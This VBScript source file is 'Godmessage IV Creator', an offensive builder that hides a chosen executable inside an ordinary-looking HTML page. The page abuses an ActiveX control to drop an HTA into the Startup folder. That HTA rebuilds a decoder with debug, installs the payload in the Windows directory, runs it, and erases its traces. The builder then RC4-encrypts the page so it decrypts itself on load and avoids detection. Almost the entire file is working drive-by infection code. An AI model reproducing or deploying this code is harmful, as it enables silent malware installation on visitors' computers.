'********************************************************************
' Godmessage IV Creator v0.4
' Author: 6IT
' Thanks: The Pull - Creator of the original Godmessage - this is his brain child.
' Thanks: StoneFisk - Coauthor of Godmessage IV.
' Thanks: To all the people who helped make godmessage what it is today
'
' CHANGE LOG 10-18-00
' - See Readme.txt
'********************************************************************
Option Explicit

Dim Message, Title, Text1
Dim fso, WSHSHell, exefile, htmlfile
Dim tStart, tElapsed
Dim timeout1, timeout2, timeout3
Dim state(255)
Dim key(255)
Message = "Enter the name of the executable to wrap in Godmessage IV" 
Title = "6IT's Godmessage IV Creator v0.4"
Text1 = "Sorry, user input was canceled"
Set fso = CreateObject("Scripting.FileSystemObject")
Set WSHShell = CreateObject("WScript.Shell")
Const ForReading = 1 
Const ForAppending = 8
exefile = InputBox(Message,Title,"onz.exe", 4000, 3000)
If exefile = "" Then
	WScript.Echo Text1
	WScript.Quit()
ElseIf exefile = "onz.exe" Then

	If fso.FileExists(exefile) Then 
		GMCreate()
	Else 
		WScript.Echo "File Doesn't Exist!"
		WScript.Quit()
	End If
Else
	If fso.FileExists(exefile) Then
		fso.CopyFile exefile, "onz.exe", True
		GMCreate()
	Else 
		WScript.Echo "File Doesn't Exist!"
		WScript.Quit()
	End If
End If
WScript.Echo "Success! and Elapsed time=" & tElapsed & " seconds"
WScript.Quit()

Sub GMCreate()
PrptHtmlFile()
PrptTimeouts()  
Dim inputHtml, output
Set output = fso.CreateTextFile("Godmessage.html", True)
tStart = timer()
CheckSize()
CreateXXE()
inputHtml = Insert(htmlfile)
output.Write(InputHtml)
output.close
CryptHtml()
fso.DeleteFile "onz.xxe", True
tElapsed = timer()
tElapsed = tElapsed - tStart
End Sub

Sub PrptHtmlFile()
Dim MessHtml
MessHtml = "Please enter the filename for the html file."
htmlfile = InputBox(MessHtml,Title,"default.html", 4000, 3000)
If htmlfile = "" Then
	WScript.Echo Text1
	WScript.Quit()
ElseIf Not fso.FileExists(htmlfile) Then
	WScript.Echo "File Doesn't Exist!"
	WScript.Quit()
End If
End Sub

Sub PrptTimeouts()
Dim Message1, Message2, Message3
Message1 = "Enter the timeout for the 'Path' setProperty."
Message2 = "Enter the timeout for the 'Doc' setProperty."
Message3 = "Enter the timeout for the 'invoke' method."
timeout1 = InputBox(Message1,Title,"15", 4000, 3000)
timeout2 = InputBox(Message2,Title,"2000", 4000, 3000)
timeout3 = InputBox(Message3,Title,"2500", 4000, 3000)
End Sub

Sub CheckSize()
Dim fs, fsize
Set fs = fso.GetFile("onz.exe")
fsize = fs.Size
If fsize > 34500 Then
WScript.Echo "File is Greater Than 34500 Bytes"
WScript.Quit()
End If
End Sub

Sub CreateXXE()
If fso.FileExists("onz.xxe") Then 
fso.DeleteFile "onz.xxe", True
End If
WSHShell.Run "%comspec% /c xxencode.com onz.exe",0,True
End Sub

Function Insert(html)
Dim f1, i, s, strBdy 
Dim regExBdy, retValBdy, retStrBdy
ReDim htmlArr(-1)
Set f1 = fso.OpenTextFile(html, ForReading)
i = 0
Do While NOT f1.AtEndOfStream
s = f1.ReadLine
Set regExBdy = New RegExp
regExBdy.Pattern = "<BODY"
regExBdy.IgnoreCase = True
retValBdy = regExBdy.Test(s)
If retValBdy Then
	Dim regExOnL, retValOnL, retStrOnL 
	Dim MatchOnL, MatchesOnL, MatchBdy, MatchesBdy
	Set regExOnL = New RegExp
	regExOnL.Pattern = "onLoad="
	regExOnL.IgnoreCase = True
	retValOnL = regExOnL.Test(s)
	If retValOnL Then
		Set MatchesOnL = regExOnL.Execute(s)
		For Each MatchOnL in MatchesOnL  
		retStrOnL = MatchOnL.FirstIndex
		Next 
		strBdy = Left(s, retStrOnL + 8) & "f(); " & Right(s, Len(s)-(retStrOnL + 8))
		s = strBdy	
	Else	
	Set MatchesBdy = regExBdy.Execute(s)
	For Each MatchBdy in MatchesBdy  
		retStrBdy = MatchBdy.FirstIndex
	Next
	strBdy = Left(s, retStrBdy + 5) & " onLoad=""f()"" " & Right(s, Len(s)-(retStrBdy + 5))
	s = strBdy
	End If
End If
Dim regExEnd, retValEnd, retStrEnd, MatchEnd, MatchesEnd
Set regExEnd = New RegExp
regExEnd.Pattern = "</BODY>"
regExEnd.IgnoreCase = True
retValEnd = regExEnd.Test(s)
If retValEnd Then
	Set MatchesEnd = regExEnd.Execute(s)
	For Each MatchEnd in MatchesEnd  
		retStrEnd = MatchEnd.FirstIndex
	Next 
	strBdy = Left(s, retStrEnd) & GenHtml() & Right(s, Len(s)-(retStrEnd))
	s = strBdy
End If
ReDim preserve htmlArr(i)
htmlArr(i) = s
i = i + 1
Loop
f1.Close
Insert = Join(htmlArr, vbNewline) 
End Function

Function StartHtml(setTimeout1, setTimeout2, setTimeout3)
Dim html(16)
html(1) = "<APPLET HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET>"
html(2) = "<SCRIPT language=JAVASCRIPT>"
html(3) = "a1=document.applets[0];"
html(4) = "fn=""..\\\\Start Menu\\\\Programs\\\\Startup\\\\EA.HTA"";"
html(5) = "function f(){"
html(6) = "cl=""{06290BD5-48AA-11D2-8432-006008C3FBFC}"";"
html(7) = "a1.setCLSID(cl);"
html(8) = "a1.createInstance();"
html(9) = "setTimeout(""a1.setProperty('Path','""+fn+""')""," & setTimeout1 & ");"
html(10) = "setTimeout(""a1.setProperty('DOC',doc)""," & setTimeout2 & ");"
html(11) = "setTimeout(""a1.invoke('write',VA)""," & setTimeout3 & ");}"
html(12) = "</SCRIPT><SCRIPT language=VBSCRIPT>"
html(13) = "Option Explicit"
html(14) = "Dim VA, doc"
html(15) = "VA = ARRAY()"
HTML(16) = ""
StartHtml = Join(html, vbNewline)
End Function

Function EncodeXXE()
Dim Input, nline, nl, s, a
Dim fLine1, fLine2, fLine
Set input = fso.OpenTextFile("onz.xxe", ForReading) 
nLine = " & vbNewline"
nl = " & Chr(13) & Chr(10) & "
s = input.ReadLine
fLine1 = "set onzXxe=fso.CreateTextFile(" & Chr(34) & Chr(34) & "onz.xxe" & Chr(34) & Chr(34) & ")"""
fLine2 = """onzXxe.WriteLine " & Chr(34) & Chr(34) & s & Chr(34) & Chr(34)
ReDim ca(-1)
redim preserve ca(0)
ca(0) = fLine1
redim preserve ca(1)
ca(1) = nl
redim preserve ca(2)
ca(2) = fLine2
redim preserve ca(3)
ca(3) = nLine
a = 4
Do While NOT input.AtEndOfStream
ReDim preserve ca(a)
s = input.ReadLine
If s = "" Then
ca(a) = nLine
Else
fLine = " & " & Chr(34) & Chr(34) & s & Chr(34) & Chr(34) 
ca(a) = fLine & nLine
End If
a = a+1
Loop
ReDim preserve ca(a)
ca(a) = Chr(34) & nl & """onzXxe.close""" & nl & Chr(34)
input.Close 
EncodeXXE = Join(ca, "")
End Function

Function GenHtml()
Dim nl, htmlEnd, htmlstart, f1
nl = Chr(34) & " & Chr(13) & Chr(10) & " & Chr(34)
Dim ar1(5), ar2(11), data(5)
ar1(0) = "Chr(13) & Chr(10) & ""<SCRIPT language=VBSCRIPT>" & nl
ar1(1) = "Set fso = CreateObject(""""Scripting.FileSystemObject"""")" & nl
ar1(2) = "Set WshShell = CreateObject(""""WScript.Shell"""")" & nl
ar1(3) = "set xxDecSrc=fso.CreateTextFile(""""xxdecode.src"""")" & nl
ar1(4) = "xxDecSrc.WriteLine  """"n xxdecode.com"""" & vbNewline & """"e 100 E9 A7 0 49 6E 70 75 74 20 66 69 6C 65 20 65 72 """" & vbNewline & """"e 110 72 6F 72 2E D A 4F 75 74 70 75 74 20 66 69 6C """" & vbNewline & """"e 120 65 20 65 72 72 6F 72 2E D A 73 74 61 72 74 20 """" & vbNewline & """"e 130 6E 6F 74 20 66 6F 75 6E 64 2E D A 45 6E 64 20 """" & vbNewline & """"e 140 6E 6F 74 20 66 6F 75 6E 64 2E D A 65 78 69 73 """" & vbNewline & """"e 150 74 73 2E 20 41 62 6F 72 74 69 6E 67 21 D A 0 """" & vbNewline & """"e 160 0 0 0 EA 3 EA 3 9A 3 0 2B 2D 30 31 32 33 """" & vbNewline & """"e 170 34 35 36 37 38 39 41 42 43 44 45 46 47 48 49 4A """" & vbNewline & """"e 180 4B 4C 4D 4E 4F 50 51 52 53 54 55 56 57 58 59 5A """" & vbNewline & """"e 190 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 """" & vbNewline & """"e 1A0 71 72 73 74 75 76 77 78 79 7A E8 F0 1 E8 62 1 """" & vbNewline & """"e 1B0 BF 9A 3 E8 EF 0 AD 3D 62 65 75 F4 AD 3D 67 69 """" & vbNewline & """"e 1C0 75 EE AD 3D 6E 20 75 E8 BF 9A 3 AC 3A C4 76 FB """" & vbNewline & """"e 1D0 AC 3A C4 75 FB AC 3A C4 76 FB 3A C4 74 4 AA AC """" & vbNewline & """"e 1E0 EB F8 BA 9A 3 33 C9 88 D 80 3E 69 1 FF 74 20 """" & vbNewline & """"e 1F0 B4 4E CD 21 3C 2 74 18 3C 12 74 14 8B CF 2B CA """" & vbNewline & """"e 200 49 49 E8 3B 1 BA 4C 1 B9 13 0 B0 5 E9 24 1 """" & vbNewline & """"e 210 B4 3C CD 21 73 3 E9 F1 0 A3 61 1 BF 9A 3 E8 """" & vbNewline & """"e 220 83 0 8A 4 A C0 74 65 3C 2B 74 61 3C 20 74 5D """" & vbNewline & """"e 230 57 BB 6A 1 BA 40 0 56 AC A C0 74 12 8B FB 8B """" & vbNewline & """"e 240 CA F2 AE 75 45 8B C7 48 2B C3 88 44 FF EB E9 5E """" & vbNewline & """"e 250 5F AC 32 E4 8B E8 B9 4 6 AD 86 C4 8A D0 D0 E4 """" & vbNewline & """"e 260 D0 E4 D2 E8 A C4 AA 4D 74 B5 8A E2 AC 8A D0 D2 """" & vbNewline & """"e 270 E4 D0 E8 D0 E8 A C4 AA 4D 74 A4 8A E2 AC 8A CD """" & vbNewline & """"e 280 D2 E4 A C4 AA 4D 75 CE EB 95 E9 A1 0 E8 15 0 """" & vbNewline & """"e 290 AD 3D 65 6E 75 5 AC 3C 64 74 3 E8 9C 0 E8 51 """" & vbNewline & """"e 2A0 0 B4 4C CD 21 8B 36 63 1 89 3E 67 1 BD 43 0 """" & vbNewline & """"e 2B0 BF 4A 3 C6 5 0 3B 36 65 1 72 6 E8 33 0 E8 """" & vbNewline & """"e 2C0 50 0 AC 3C D 74 1B 3C A 74 18 AA 4D 75 E7 3B """" & vbNewline & """"e 2D0 36 65 1 72 3 E8 3A 0 AC 3C A 75 F2 BF 9A 3 """" & vbNewline & """"e 2E0 EB C7 46 C6 5 0 89 36 63 1 8B 3E 67 1 BE 4A """" & vbNewline & """"e 2F0 3 C3 BA 9A 3 8B CA 87 E 67 1 2B CA 76 A 8B """" & vbNewline & """"e 300 1E 61 1 B4 40 CD 21 72 1 C3 BA 16 1 B9 14 0 """" & vbNewline & """"e 310 EB 22 BA EA 3 B9 0 E1 8B 1E 5F 1 B4 3F CD 21 """" & vbNewline & """"e 320 72 C B C0 74 8 8B F2 3 C6 A3 65 1 C3 BA 3 """" & vbNewline & """"e 330 1 B9 13 0 E8 9 0 E9 67 FF BA 3C 1 B9 10 0 """" & vbNewline & """"e 340 50 BB 2 0 B4 40 CD 21 58 C3 54 68 69 73 20 70 """" & vbNewline & """"e 350 72 6F 67 72 61 6D 20 72 65 71 75 69 72 65 73 20 """" & vbNewline & """"e 360 44 4F 53 20 56 65 72 73 69 6F 6E 20 32 2E 30 20 """" & vbNewline & """"e 370 6F 72 20 68 69 67 68 65 72 2E D A 24 D A 49 """" & vbNewline & """"e 380 6E 70 75 74 20 70 61 74 68 2F 66 69 6C 65 3A 20 """" & vbNewline & """"e 390 20 4E 6F 20 61 63 74 69 6F 6E D A 24 B4 30 CD """" & vbNewline & """"e 3A0 21 3C 2 73 C BA 4A 3 B4 9 CD 21 B8 1 4C CD """" & vbNewline & """"e 3B0 21 E8 36 0 73 23 BA 7D 3 B9 14 0 BB 2 0 B4 """" & vbNewline & """"e 3C0 40 CD 21 BF 7F 0 C6 5 50 8B D7 B4 A CD 21 E8 """" & vbNewline & """"e 3D0 18 0 73 5 BA 91 3 EB CF BA 2C 4 B8 0 3D CD """" & vbNewline & """"e 3E0 21 72 4 A3 5F 1 C3 E9 44 FF BE 80 0 BF 2C 4 """" & vbNewline & """"e 3F0 FC AC A C0 74 2F B4 20 AC 3A C4 76 FB 3C 2F 74 """" & vbNewline & """"e 400 4 3C 2D 75 18 8B D0 8B 4 24 5F 3D 4F 20 8B C2 """" & vbNewline & """"e 410 75 B F6 16 69 1 46 46 AC 3A C4 76 A AA AC EB """" & vbNewline & """"e 420 F8 3A C4 76 2 F9 C3 C6 5 0 F8 C3 58 58 44 20 """" & vbNewline & """"e 430 76 31 2E 31 0 44 61 76 69 64 20 50 20 4B 69 72 """" & vbNewline & """"e 440 73 63 68 62 61 75 6D 2C 20 54 6F 61 64 20 48 61 """" & vbNewline & """"e 450 6C 6C 0 0 """" & vbNewline & """"rcx"""" & vbNewline & """"353"""" & vbNewline & """"w"""" & vbNewline & """"q"""" & vbNewline" & nl
ar1(5) = "xxDecSrc.close" & nl

ar2(0) = "WshShell.Run """"%comspec% /c debug < xxdecode.src"""",0,True" & nl
ar2(1) = "WshShell.Run """"%comspec% /c xxdecode.com onz.xxe"""",0,True" & nl
ar2(2) = "WshShell.Run """"%comspec% /c move onz.exe %windir%\onz.exe"""",0,True" & nl
ar2(3) = "WshShell.Run """"%comspec% /c %windir%\onz.exe"""",0,False" & nl
ar2(4) = "fso.DeleteFile """"xxdecode.src"""", True" & nl
ar2(5) = "fso.DeleteFile """"onz.xxe"""", True" & nl
ar2(6) = "fso.DeleteFile """"xxdecode.com"""", True" & nl
ar2(7) = "strStartup = WshShell.SpecialFolders(""""Startup"""")" & nl
ar2(8) = "sysCmd = WshShell.ExpandEnvironmentStrings(""""%COMSPEC%"""")" & nl
ar2(9) = "regCmd = sysCmd & """" /c del """" & Chr(34) & strStartup & """"\ea.hta"""" & Chr(34)" & nl
ar2(10) = "WshShell.RegWrite """"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce\clean"""", regCmd" & nl
ar2(11) = "<"" & Chr(47) & ""SCRIPT><BODY onload=""""javascript: window.close()""""><"" & Chr(47) & ""BODY>"

data(0) = StartHtml(timeout1, timeout2, timeout3)
data(1) = "doc = " & Join(ar1, "")
data(2) = EncodeXXE()
data(3) = Join(ar2, "") & Chr(34)
data(4) = vbNewline
data(5) = "</SCRIPT>"
GenHtml = Join(data, "")
End Function

Sub CryptHtml()
Dim f1, f2, text, enc, eKey, html
Set f1 = fso.OpenTextFile("godmessage.html", ForReading)
Set f2 = fso.CreateTextFile("Godmessage.HexEnc.html", True)
eKey = RandPwd()
text = f1.ReadAll
enc = EnCryptHex(text, eKey)
html = WrapEnc(enc, eKey)
f2.Write html
f1.Close 
f2.Close 
End Sub

Sub RC4Initialize(strPwd)
Dim tempSwap, i, f, intLength 
	intLength = len(strPwd) 
	For i = 0 To 255 
		key(i) = asc(mid(strPwd, (i mod intLength)+1, 1)) 
		state(i) = i 
	Next
f = 0
For i = 0 To 255
    f = (f + state(i) + key(i)) Mod 256
    tempSwap = state(i)
    state(i) = state(f)
    state(f) = tempSwap
Next
End Sub

Function EnCryptHex(plaintxt, psw)
Dim temp, a, i, f, k, cipherby
dim cipher()
redim cipher(-1)
i = 0
f = 0
RC4Initialize(psw)
For a = 1 To Len(plaintxt)
    i = (i + 1) Mod 256
    f = (f + state(i)) Mod 256
    temp = state(i)
    state(i) = state(f)
    state(f) = temp
    k = (state(i) + state(f)) Mod 256
    cipherby = Asc(Mid(plaintxt, a, 1)) Xor k
	If cipherby = 0 then cipherby = Asc(Mid(plaintxt, a, 1))
	If cipherby < 16 Then 
		cipherby = "0" & CStr(Hex(cipherby))
	Else
		cipherby = Hex(cipherby)
	End If
	redim preserve cipher(a-1)
    cipher(a-1) = cipherby
Next
EnCryptHex = join( cipher, "")
End Function

Function RandPwd()
Dim i, x
ReDim pwdar(-1)
Randomize
For i = 0 To 31
ReDim preserve pwdar(i)
pwdar(i) = Chr(Int((122 - 42 + 1) * Rnd + 42))
Next
RandPwd = Join(pwdar, "")
End Function

Function WrapEnc(encText, encKey)
Dim encHtml(48)
encHtml(0) = "Option Explicit"
encHtml(1) = "Dim o, p, d, t, key(255), state(255)"
encHtml(2) = "p = """ & encKey & Chr(34)
encHtml(3) = "d = """ & encText & Chr(34) & vbNewline
encHtml(4) = "o = DeCryptHex(d, p)"
encHtml(5) = "t = setTimeout(""go()"", 500)"
encHtml(6) = "Sub go()"
encHtml(7) = "Document.Write o"
encHtml(8) = "Document.execCommand(""Refresh"")"
encHtml(9) = "End Sub"
encHtml(10) = "Sub RC4Initialize(strPwd)"
encHtml(11) = "Dim tempSwap, i, f, intLength" 
encHtml(12) = "intLength = len(strPwd)" 
encHtml(13) = "For i = 0 To 255" 
encHtml(14) = "key(i) = asc(mid(strPwd, (i mod intLength)+1, 1))" 
encHtml(15) = "state(i) = i" 
encHtml(16) = "Next"
encHtml(17) = "f = 0"
encHtml(18) = "For i = 0 To 255"
encHtml(19) = "f = (f + state(i) + key(i)) Mod 256"
encHtml(21) = "tempSwap = state(i)"
encHtml(22) = "state(i) = state(f)"
encHtml(23) = "state(f) = tempSwap"
encHtml(24) = "Next"
encHtml(25) = "End Sub"
encHtml(26) = "Function DeCryptHex(hextext, psw)" 
encHtml(27) = "Dim temp, a, x, i, f, k, cipherby"
encHtml(28) = "dim cipher()"
encHtml(29) = "redim cipher(-1)"
encHtml(30) = "x = 0"
encHtml(31) = "i = 0"
encHtml(32) = "f = 0"
encHtml(33) = "Call RC4Initialize(psw)"
encHtml(34) = "For a = 1 To Len(hextext) Step 2"
encHtml(35) = "i = (i + 1) Mod 256"
encHtml(36) = "f = (f + state(i)) Mod 256"
encHtml(37) = "temp = state(i)"
encHtml(38) = "state(i) = state(f)"
encHtml(39) = "state(f) = temp"
encHtml(40) = "k = (state(i) + state(f)) Mod 256"
encHtml(41) = "cipherby = Asc(Chr(Eval(""&H"" & Mid(hextext, a, 2)))) Xor k"
encHtml(42) = "if cipherby = 0 then cipherby = Asc(Chr(Eval(""&H"" & Mid(hextext, a, 2))))" & vbNewline
encHtml(43) = "redim preserve cipher(x)"
encHtml(44) = "cipher(x) = Chr(cipherby)"
encHtml(45) = "x = x + 1"
encHtml(46) = "Next"
encHtml(47) = "DeCryptHex = join( cipher, """")"
encHtml(48) = "End Function"
WrapEnc = "<Script Language=VBScript>" & vbNewLine & Join(encHtml, " : ") & vbNewLine & "</SCRIPT>"
End Function
